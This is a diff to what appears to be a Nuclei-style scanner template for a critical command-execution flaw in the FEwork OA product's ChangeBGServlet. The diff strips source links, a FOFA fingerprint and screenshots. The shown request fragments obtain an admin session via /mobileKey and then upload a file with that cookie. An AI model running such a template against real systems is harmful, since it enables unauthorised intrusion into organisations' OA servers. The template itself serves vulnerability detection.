@@ -3,12 +3,8 @@ info:
   name: 飞企互联OA FEwork ChangeBGServlet 存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/crsl5fn2osck93gg'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: crsl5fn2osck93gg
-    fofa: app="FE-协作平台"
 http:
 - raw:
   - 'POST /mobileKey HTTP/1.1
@@ -21,9 +17,6 @@ http:
 
 
     userName=admin
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1760261254072-ca897beb-3184-42e7-b7cd-d755f0a6d89e.png)
 
 
     携带cookie上传文件'
@@ -58,13 +51,7 @@ http:
     ------WebKitFormBoundaryKNt0t4vBe8cX9rZk--
 
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1760261254369-e1b4256c-aab0-4729-9a75-08c2435817d4.png)
-
-
-    PS：回显了完整绝对路径，验证得加cookie
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1760261254590-dec3e192-aae4-4a2f-89dc-cd7b78bb7f86.png)'
+    PS：回显了完整绝对路径，验证得加cookie'
   redirects: false
   matchers:
   - status:
